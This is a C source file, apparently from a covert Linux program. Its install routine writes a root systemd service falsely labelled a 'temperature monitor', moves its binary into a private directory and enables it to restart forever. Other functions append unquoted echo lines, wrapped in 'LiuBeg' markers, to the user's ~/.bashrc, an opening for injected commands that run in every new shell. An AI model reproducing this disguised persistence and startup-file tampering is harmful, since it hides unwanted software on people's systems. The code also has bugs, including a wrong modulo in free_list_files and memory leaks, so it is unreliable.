#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <errno.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>

#include "../include/types.h"

#define MAX_FILE_NAME 255
#define MAX_FILES 256

void free_list_files(char **list, int len)
{
	if (!list)
		return;

	int real_len = len / MAX_FILES;

	if ((len % MAX_FILE_NAME) != 0)
		real_len++;

	for (int i = 0; i < real_len * MAX_FILES; i++)
		free(list[i]);

	free(list);
}

char **list_files(char *dir_name, int *len)
{
	struct dirent *de;
	DIR *dr = opendir(dir_name);

	if (!dr)
	{
		DEBUG_PRINT((P_ERROR "Could not open directory\n"));
		return NULL;
	}

	// Alloc the memory for 256 files with 255 + 1 byte names
	char **file_list = calloc(MAX_FILES, sizeof(char *));
	if (!file_list)
	{
		DEBUG_PRINT((P_ERROR "Could not get memory for file list\n"));
		return NULL;
	}
	for (int i = 0; i < MAX_FILES; i++)
	{
		DEBUG_PRINT((P_INFO "Getting memory for file name num %d\n", i));
		file_list[i] = calloc(MAX_FILE_NAME + 1, sizeof(char));
		if (!file_list[i])
		{
			DEBUG_PRINT((P_ERROR "Could not get memory for file name\n"));
			return NULL;
		}
	}

	int i = 0; // Current file
	int j = 1; // Takes care of realloc
	while ((de = readdir(dr)) != NULL)
	{
		if (strcmp(de->d_name, ".") && strcmp(de->d_name, "..") && strcmp(de->d_name, ""))
		{
			DEBUG_PRINT((P_INFO "Copying [%s] to %p [%ld] in pos %d\n", de->d_name, file_list[i], strlen(de->d_name), i));
			strncpy(file_list[i], de->d_name, MAX_FILE_NAME);

			if (i == (MAX_FILES * j) - 1)
			{
				DEBUG_PRINT((P_WARN "Limit reached, executing realloc\n"));
				j++;
				file_list = realloc(file_list, (MAX_FILES * j) * sizeof(char *));
				for (int k = i + 1; k < MAX_FILES * j; k++)
				{
					DEBUG_PRINT((P_INFO "Getting memory for file name num %d\n", k));
					file_list[k] = calloc(MAX_FILE_NAME + 1, sizeof(char));
					if (!file_list[k])
					{
						DEBUG_PRINT((P_ERROR "Could not get memory for file name inside realloc\n"));
						return NULL;
					}
				}
			}

			i++;
		}
	}

	// Save the total number of files
	*len = i;

	closedir(dr);

	DEBUG_PRINT((P_OK "All files saved in file_list correctly\n"));
	return file_list;
}

int already_running()
{
	FILE *fp;
	char output[STD_SIZE] = "";

	// Get list of processes and count lines containing NAME
	fp = popen("ps -C " NAME " | wc -l", "r");
	if (!fp)
	{
		DEBUG_PRINT(("Error\n"););
	}

	// Get the info of the process and print it
	while (fgets(output, sizeof(output) - 1, fp) != NULL)
		;
	DEBUG_PRINT((P_INFO "%s\n", output));

	// If the output is over 2 lines, then it is running
	if (atoi(output) > 2)
	{
		return OK;
	}

	return ERROR;
}

int install()
{
	FILE *y_service = NULL;
	char service_data[] =
		"[Unit]\nDescription=" NAME " temperature monitor\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType=simple\nRestart=always\nRestartSec=1\nExecStart=" BIN "\n\n[Install]\nWantedBy=multi-user.target\n";

	if (access(BIN, F_OK) != -1)
		return OTHER;

	y_service = fopen("/etc/systemd/system/" NAME ".service", "w");
	if (!y_service)
		return ERROR;

	// Create home and move there
	if (mkdir(HOME, S_IRWXU) != 0)
		return ERROR;

	if (rename(NAME, BIN) != 0)
		return ERROR;

	// Make a daemon
	fputs(service_data, y_service);
	fclose(y_service);
	system("systemctl daemon-reload; systemctl start " NAME "; systemctl enable " NAME);

	return OK;
}

int add_terminal_message(char *msg)
{
	FILE *file;
	int i;

	char *home = getenv("HOME");
	if (home == NULL)
		return ERROR;

	char *path = "/.bashrc";
	size_t len = strlen(home) + strlen(path) + 1;
	char *fullpath = malloc(len);
	if (fullpath == NULL)
		return ERROR;

	for (i = 0; i < len; i++)
	{
		int aux = strlen(home);
		if (i < aux)
		{
			fullpath[i] = home[i];
		}

		else
		{
			fullpath[i] = path[i - aux];
		}
	}
	fullpath[i] = 0;

	file = fopen(fullpath, "a");

	if (file == NULL)
	{
		DEBUG_PRINT((P_ERROR " Can't open '~/.bashrc'\n"));
		return ERROR;
	}

	fprintf(file, "\n#LiuBeg\n");
	fprintf(file, "echo ");
	fprintf(file, "%s\n", msg);
	fprintf(file, "\n##LiuEnd\n");

	fclose(file);

	return OK;
}

int add_terminal_message_with_colour(char *msg, char *colour)
{
	FILE *file;
	int i;

	char *home = getenv("HOME");
	if (home == NULL)
		return ERROR;

	char *path = "/.bashrc";
	size_t len = strlen(home) + strlen(path) + 1;
	char *fullpath = malloc(len);
	if (fullpath == NULL)
		return ERROR;

	for (i = 0; i < len; i++)
	{
		int aux = strlen(home);
		if (i < aux)
		{
			fullpath[i] = home[i];
		}

		else
		{
			fullpath[i] = path[i - aux];
		}
	}
	fullpath[i] = 0;

	file = fopen(fullpath, "a");

	if (file == NULL)
	{
		DEBUG_PRINT((P_ERROR " Can't open '~/bashrc' :(\n"));
		return ERROR;
	}

	fprintf(file, "\n#LiuBeg\n");
	fprintf(file, "echo ");
	fprintf(file, "'\033[%sm%s\033[0m'", colour, msg);
	fprintf(file, "\n#LiuEnd");

	fclose(file);
	return OK;
}

int get_random_number()
{

	int fd_shm;
	int *value;
	int aux;

	fd_shm = shm_open(SHM_BASHPID, O_RDWR, S_IWUSR);

	/*Control de errores*/
	if (fd_shm == -1)
	{
		DEBUG_PRINT((P_ERROR " [GET_RANDOM_NUMBER] Error opening the shared memory\n"));
		return EXIT_FAILURE;
	}

	/* Mapeamos la memoria ya creada */
	value = (int *)mmap(NULL, sizeof(*value), PROT_READ | PROT_WRITE, MAP_SHARED, fd_shm, 0);
	if (value == MAP_FAILED)
	{
		DEBUG_PRINT((P_ERROR " [GET_RANDOM_NUMBER] Error mapping the shared memory segment\n"));
		return EXIT_FAILURE;
	}

	aux = *value;

	munmap(value, sizeof(*value));

	//If this is the father proccess
	if ((int)getppid() == aux)
	{
		srand((int)getpid());
	}
	//If the process if a child proccess
	else
	{
		srand((int)getppid());
	}

	//"return 3" would be ok according to @solanav
	return rand();
}

int get_sharedmemory_current_number()
{
	int fd_shm;

	int *value;
	int aux;

	/* Abrimos la memoria compartida */
	fd_shm = shm_open(SHM_CHECKNUMBER, O_RDWR, S_IWUSR);

	/*Control de errores*/
	if (fd_shm == -1)
	{
		fprintf(stderr, "Error opening the shared memory segment \n");
		return EXIT_FAILURE;
	}

	/* Mapeamos la memoria ya creada */
	value = (int *)mmap(NULL, sizeof(*value), PROT_READ | PROT_WRITE, MAP_SHARED, fd_shm, 0);
	if (value == MAP_FAILED)
	{
		fprintf(stderr, "Error mapping the shared memory segment \n");
		return EXIT_FAILURE;
	}

	aux = *value;

	munmap(value, sizeof(*value));

	return aux;
}

int create_checknumber()
{
	//flag O_EXCL isn't here because if the program has been executed before, the shared memory is
	//already created with the previous value and if someone deletes the creation of this at the
	//it won't work
	int fd_shm = shm_open(SHM_CHECKNUMBER, O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);
	if (fd_shm == -1)
	{
		DEBUG_PRINT((P_ERROR " [CHECKNUMBER] Error creating the shared memory\n"));

		return ERROR;
	}

	// Resizing shared memory
	int error = ftruncate(fd_shm, sizeof(int));

	if (error == -1)
	{
		DEBUG_PRINT((P_ERROR " [CHECKNUMBER] Error resizing the shared memory segment\n"));

		shm_unlink(SHM_CHECKNUMBER);
		return ERROR;
	}

	// Mapping shared memory
	int *checknumber = mmap(NULL, sizeof(*checknumber),
							PROT_READ | PROT_WRITE, MAP_SHARED, fd_shm, 0);
	if (checknumber == MAP_FAILED)
	{
		DEBUG_PRINT((P_ERROR " [CHECKNUMBER] Error mapping the shared memory segment\n"));

		shm_unlink(SHM_CHECKNUMBER);
		return ERROR;
	}

	*checknumber = get_random_number();

	return OK;
}
